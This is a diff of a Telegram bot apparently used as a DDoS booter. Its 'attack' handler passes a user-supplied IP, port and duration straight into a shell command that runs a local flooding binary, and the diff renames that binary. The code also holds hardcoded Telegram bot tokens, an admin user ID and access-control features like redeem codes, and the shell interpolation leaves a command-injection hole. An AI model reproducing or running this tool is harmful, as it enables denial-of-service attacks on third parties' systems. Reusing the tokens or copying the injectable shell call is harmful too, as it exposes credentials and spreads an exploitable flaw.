@@ -26,7 +26,7 @@ db = client['VIKASH']
 users_collection = db['DARK']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7921561011:AAFGXuJlpKecxaFvOmPnVpakXa4CbL7Jmm4'
+TELEGRAM_BOT_TOKEN = '7921561011:AAHhecTxlaZk7YtRMzG8eFPtV_9mgZnITJE'
 ADMIN_USER_ID = 7868530718
 
 cooldown_dict = {}
@@ -176,7 +176,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soulcracks {ip} {port} {duration}",
+            f"./LEGEND3 {ip} {port} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -441,7 +441,7 @@ def get_status(active_inactive,):
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-  #  application.add_handler(CommandHandler("status", get_status))
+    application.add_handler(CommandHandler("status", get_status))
     application.add_handler(CommandHandler("add", add_user))
     application.add_handler(CommandHandler("remove", remove_user))
     application.add_handler(CommandHandler("attack", attack))
